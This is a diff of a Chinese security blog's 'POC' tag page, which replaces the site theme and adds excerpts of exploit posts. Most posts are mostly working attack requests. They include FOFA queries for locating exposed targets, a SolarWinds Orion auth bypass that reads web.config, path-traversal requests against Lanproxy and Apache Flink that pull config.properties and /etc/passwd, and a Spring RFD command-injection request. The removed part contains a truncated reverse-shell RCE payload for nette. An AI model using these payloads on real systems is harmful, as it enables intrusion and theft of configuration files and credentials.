@@ -1,278 +1,613 @@
-
-<!DOCTYPE html>
-<html lang="zh-Hans" class="loading">
+<!doctype html>
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tag: POC - Sec H</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="渗透测试,"> 
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <meta name="author" content="Sec H"> 
-    <link rel="alternative" href="atom.xml" title="Sec H" type="application/atom+xml"> 
-    <link rel="icon" href="/img/gao.ico"> 
-    
-    
-<link rel="stylesheet" href="/css/diaspora.css">
+    <title>`POC`标签下的文章 | Sec H</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
+    <meta name="description" content="Jelon个人前端小站" >
 
-	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-    <script>
-         (adsbygoogle = window.adsbygoogle || []).push({
-              google_ad_client: "ca-pub-8691406134231910",
-              enable_page_level_ads: true
-         });
-    </script>
-    <script async custom-element="amp-auto-ads"
-        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
-    </script>
+    
+    <link rel="alternative" href="/atom.xml" title="Sec H" type="application/atom+xml" >
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico" >
+    
+    
+<link rel="stylesheet" href="/css/style.css?v=1610591855264.css">
+
+    <!--[if lt IE 9]>
+    
+<script src="/js/html5.js"></script>
+
+    <![endif]-->
+    
+
 <meta name="generator" content="Hexo 5.3.0"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Sec H</span>
-    <div id="loader"></div>
-    <div class="nav">
-    <ul id="menu-menu" class="menu">
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a target="_blank" rel="noopener" href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Sec H</span>
+                    <span class="description">Welcom to My Blog :)</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/tags/POC/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/tags/POC/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/tags/POC/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/tags/POC/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/jangdelong" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
+                    
+                        <a href="https://juejin.im/user/3984285869282919" class="qqweibo" target="_blank"><b>■</b> 掘金</a>
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 按标签分类 -->
+
+    <h3 class="widget-hd">
+        <strong>
+            
+                `POC`标签下的文章
+            
+        </strong>
+    </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
         
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="//" title="首页" target="_blank" rel="noopener">首页</a>
-        </li>
+            <a href="javascript: void(0);" class="cat">未分类</a>
         
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/categories/" title="分类" target="_blank" rel="noopener">分类</a>
-        </li>
+        <!-- 文章标题 -->
         
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/tags/" title="标签" target="_blank" rel="noopener">标签</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/archives/" title="归档" target="_blank" rel="noopener">归档</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/about/" title="关于" target="_blank" rel="noopener">关于</a>
-        </li>
-        
-    </ul>
-	<span class="target"></span>
-	<center>
-	<div class="hitokoto">
-		<span class="typed" id="hitokoto" data-st="true"></span>
-	</div>
-	</center>
-	
-	<p class="footerlinks">
-		<a href="#" class="iconfont icon-null"></a>
-		
-            <a href="https://www.facebook.com/profile.php?id=100057569016241" title="facebook" class="iconfont icon-facebook" target="_blank" rel="noopener"> </a>
-        
-            <a href="https://twitter.com/cawk07666665?s=09" title="twitter" class="iconfont icon-twitter" target="_blank" rel="noopener"> </a>
-        
-            <a href="https://github.com/givemefivw" title="github" class="iconfont icon-github" target="_blank" rel="noopener"> </a>
-        
-            <a href="/img/wechat.png" title="wechat" class="iconfont icon-wechat" target="_blank" rel="noopener"> </a>
-        
-            <a href="/motallkali@163.com" title="email" class="iconfont icon-email" target="_blank" rel="noopener"> </a>
-        
-		<a href="#" class="iconfont icon-null"></a>
-	</p>
-	
-    <p id="copyright">
-        &copy; 2021 Sec H.
-        <span> | </span>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
-        <span> | </span>Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a> by Fechin
-		
-		<span> | </span><a rel="nofollow" href="http://www.beian.miit.gov.cn" target="_blank">沪ICP备1433223:)号</a>
-		
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2021/01/13/CVE-2020-10148SolarWindsOrionAPI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    		CVE-2020-10148SolarWindsOrionAPI远程代码执行漏洞
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2021-01-13T12:27:15.000Z">2021-01-13</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
     </p>
-</div>
 
-<div id="container">
-    
-<div id="screen">
-    <div id="mark">
-        <div class="layer" data-depth="0.4">
-            <img src="/img/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080">
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SolarWinds Orion API 嵌入在 Orion Core 中，被用于与所有 SolarWinds Orion Platform 产品进行接口。通过在URI请求的Request.PathInfo 部分中包含特定参数，可以绕过 API 身份验证，这可能允许攻击者执行未经身份验证的 API 命令。如果攻击者将WebResource.adx，scriptResource.adx，i18n.ashx 或 Skipi18n 的 PathInfo 参数附加到对 SolarWinds Orion 服务器的请求，SolarWinds 可能会设置 SkipAuthorization 标志，该标志可能允许处理API请求无需身份验证。<br>攻击者可利用该漏洞远程执行任意代码，有专业黑客组织利用该漏洞投递代号为’SUPERNOVA’的恶意程序。</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>2019.4 HF 6之前的版本</li>
+<li>SolarWinds Orion 2020.2.1<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2>FOFA搜索：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app&#x3D;&quot;SolarWinds-Network-Performance-Monitor&quot;</span><br></pre></td></tr></table></figure>
+访问<code>/Orion/invalid.aspx.js</code>路径，记录返回值中的<code>Location</code>字段<br>例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: &#x2F;Orion&#x2F;invalid.aspx.js.i18n.ashx?l&#x3D;en-us&amp;v&#x3D;43297.72</span><br></pre></td></tr></table></figure>
+<img src="/2021/01/13/CVE-2020-10148SolarWindsOrionAPI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>将<code>.i18n.ashx?l=en-us&amp;v=43005.14.L</code>字段带入访问路径，绕过验证<br>例如访问WEB.config</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;web.config.i18n.ashx?l&#x3D;en-us&amp;v&#x3D;43297.72</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/13/CVE-2020-10148SolarWindsOrionAPI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nosec.org&#x2F;home&#x2F;detail&#x2F;4630.html</span><br></pre></td></tr></table></figure>
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2021/01/13/CVE-2020-10148SolarWindsOrionAPI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2021/01/13/CVE-2020-10148SolarWindsOrionAPI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2020-10148SolarWindsOrionAPI远程代码执行漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
+                
+            </a>
         </div>
     </div>
-    <div id="vibrant">
-        <svg viewBox="0 0 2880 1620" height="100%" preserveAspectRatio="xMaxYMax slice">
-            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 "/>
-        </svg>
-        <div></div>
-    </div>
-    <div id="header">
-        <div>
-            <a class="image-logo" href="/"></a>
-			
-            <div class="iconfont icon-menu switchmenu"></div>
-        </div>
-    </div>
-    
-    <div id="post0">
-        <p>一月 13, 2021</p>
-        <h2><a href="/2021/01/13/CVE-2020-10148SolarWindsOrionAPI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2020-10148SolarWindsOrionAPI远程代码执行漏洞" class="posttitle">CVE-2020-10148SolarWindsOrionAPI远程代码执行漏洞</a></h2>
-        <p class="summary">漏洞简介SolarWinds Orion API 嵌入在 Orion Core 中，被用于与所有 SolarWin...</p>
-    </div>
-    
-</div>
+</article>
 
-    <div id="primary">
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
         
-<div class="post">
-    <a href="/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" title="CVE-2021-3019 Lanproxy 路径遍历漏洞">
-        <img src="/img/2.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>一月 12, 2021</p>
-        <h3><a href="/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" title="CVE-2021-3019 Lanproxy 路径遍历漏洞" class="posttitle">CVE-2021-3019 Lanproxy 路径遍历漏洞</a></h3>
-        <p>简介lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、...</p>
-    </div>
-</div>
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">
+    		CVE-2021-3019 Lanproxy 路径遍历漏洞
+    	</a>
+    </h3>
 
-
-<div class="post">
-    <a href="/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-17519 Apache Flink 任意文件读取漏洞">
-        <img src="/img/2.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>一月 07, 2021</p>
-        <h3><a href="/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-17519 Apache Flink 任意文件读取漏洞" class="posttitle">CVE-2020-17519 Apache Flink 任意文件读取漏洞</a></h3>
-        <p>仅供测试！FOFA查找：app=”Apache Flink”
-未授权![](CVE-2020-17519 Apache Flink 任意文件读取漏洞POC...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2020/12/24/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%20%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDPOC/" title="CVE-2020-5398-Spring MVC的RFD 反射文件下载POC">
-        <img src="/img/2.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>十二月 24, 2020</p>
-        <h3><a href="/2020/12/24/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%20%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDPOC/" title="CVE-2020-5398-Spring MVC的RFD 反射文件下载POC" class="posttitle">CVE-2020-5398-Spring MVC的RFD 反射文件下载POC</a></h3>
-        <p>漏洞描述当响应中设置了Content-Disposition头且filename属性是用户可控时容易受到RFD攻击
-利用条件1、header使用org.s...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC">
-        <img src="/img/2.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>十二月 23, 2020</p>
-        <h3><a href="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC" class="posttitle">CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC</a></h3>
-        <p>漏洞影响版本Apache Cocoon &lt;= 2.1.12
-POC向/v2/api/product/manger/getInfo位置 POST如下内...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CVE-2020-14882&CVE-2020-14883WeblogicHttpConsole权限绕过&命令执行">
-        <img src="/img/2.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>十二月 21, 2020</p>
-        <h3><a href="/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CVE-2020-14882&amp;CVE-2020-14883WeblogicHttpConsole权限绕过&amp;命令执行" class="posttitle">CVE-2020-14882&amp;CVE-2020-14883WeblogicHttpConsole权限绕过&amp;命令执行</a></h3>
-        <p>漏洞简介CVE-2020-14883通过HTTP请求绕过用户身份鉴定，对高权限的后台Console进行访问
-CVE-2020-14882通过高权限的后台C...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" title="CVE-2020-15227 PHP Framework nette callback RCE POC">
-        <img src="/img/2.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>十二月 20, 2020</p>
-        <h3><a href="/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" title="CVE-2020-15227 PHP Framework nette callback RCE POC" class="posttitle">CVE-2020-15227 PHP Framework nette callback RCE POC</a></h3>
-        <p>POC1&#x2F;nette.micro?callback&#x3D;shell_exec&amp;cmd&#x3D;bash%20-i%20&gt;&...</p>
-    </div>
-</div>
-
-
-    </div>
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2021-01-12T06:07:58.000Z">2021-01-12</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
     
-</div>
-<div id="preview"></div>
+        <a href="/tags/POC/" title="POC">POC</a>
+    
 
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面…）。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>FOFA搜索：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header&#x3D; &quot;Server: LPS-0.1&quot;</span><br></pre></td></tr></table></figure>
+<p>登陆页面抓包<br>POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;..&#x2F;conf&#x2F;config.properties HTTP&#x2F;1.1</span><br><span class="line">Host: host:8090</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http:&#x2F;&#x2F;host:8090</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;host:8090&#x2F;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;&quot;,&quot;password&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" title="CVE-2021-3019 Lanproxy 路径遍历漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/2.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/">
+    		CVE-2020-17519 Apache Flink 任意文件读取漏洞
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2021-01-07T07:05:58.016Z">2021-01-07</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h1 id="仅供测试！"><a href="#仅供测试！" class="headerlink" title="仅供测试！"></a>仅供测试！</h1><p>FOFA查找：app=”Apache Flink”</p>
+<h2 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h2><p>![](CVE-2020-17519 Apache Flink 任意文件读取漏洞POC/2.png)</p>
+<h2 id="任意文件读取POC"><a href="#任意文件读取POC" class="headerlink" title="任意文件读取POC"></a>任意文件读取POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;host:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
+<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>![](CVE-2020-17519 Apache Flink 任意文件读取漏洞POC/1.png)</p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-17519 Apache Flink 任意文件读取漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/7.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/24/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%20%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDPOC/">
+    		CVE-2020-5398-Spring MVC的RFD 反射文件下载POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-24T07:05:01.660Z">2020-12-24</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>当响应中设置了<code>Content-Disposition</code>头且<code>filename</code>属性是用户可控时容易受到RFD攻击</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1、<code>header</code>使用<code>org.springframework.http.ContentDisposition</code>来预备<br>2、文件名是通过<code>ContentDisposition.Builder#filename(String)</code>或 <code>ContentDisposition.Builder#filename(String, US_ASCII)</code>来设置。<br>3、文件名(包括文件名后缀)为用户可控。<br>4、攻击者已将下载的响应内容注入恶意命令</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Spring Framework 5.2.0 to 5.2.2，5.1.0 to 5.1.12，5.0.0 to 5.0.15</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?filename&#x3D;sample.sh%22%3B&amp;contents&#x3D;%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP&#x2F;1.1 </span><br><span class="line">Host: ip:8080 </span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0 </span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,&#x2F;;q&#x3D;0.8 Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3 </span><br><span class="line">Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/24/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%20%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/24/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%20%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDPOC/" title="CVE-2020-5398-Spring MVC的RFD 反射文件下载POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/4.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/">
+    		CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-23T09:09:02.564Z">2020-12-23</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache Cocoon &lt;= 2.1.12</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>向<code>/v2/api/product/manger/getInfo</code>位置 <code>POST</code>如下内容即可</p>
